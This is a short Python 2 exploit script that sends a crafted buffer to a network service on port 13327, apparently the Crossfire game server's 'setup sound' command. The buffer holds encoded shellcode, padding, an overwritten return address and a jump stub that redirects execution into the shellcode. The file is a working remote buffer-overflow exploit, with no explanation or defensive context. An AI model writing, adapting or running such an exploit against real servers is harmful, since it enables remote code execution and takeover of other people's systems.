#!/usr/bin/python
import socket

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax


host = "127.0.0.1"

shellcode=("\xdb\xc2\xbe\x16\x16\xe7\xd8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x14\x31\x70\x19\x03\x70\x19\x83\xe8\xfc\xf4\xe3\xd6\x03\x0f"
"\xe8\x4a\xf7\xbc\x85\x6e\x7e\xa3\xea\x09\x4d\xa3\x50\x88\x1f"
"\xcb\x64\x34\xb1\x57\x03\x24\xe0\x37\x5a\xa5\x68\xd1\x04\xeb"
"\xed\x94\xf4\xf7\x5e\xa2\x46\x91\x6d\x2a\xe5\xee\x08\xe7\x6a"
"\x9d\x8c\x9d\x55\xfa\xe3\xe1\xe3\x83\x03\x89\xdc\x5c\x87\x21"
"\x4b\x8c\x05\xd8\xe5\x5b\x2a\x4a\xa9\xd2\x4c\xda\x46\x28\x0e")

ret="\x97\x45\x13\x08"
crash=shellcode + "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
#crash="\x41" * 4368 + "\x42"*4 + "C"*7

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*]Payload Sent !"
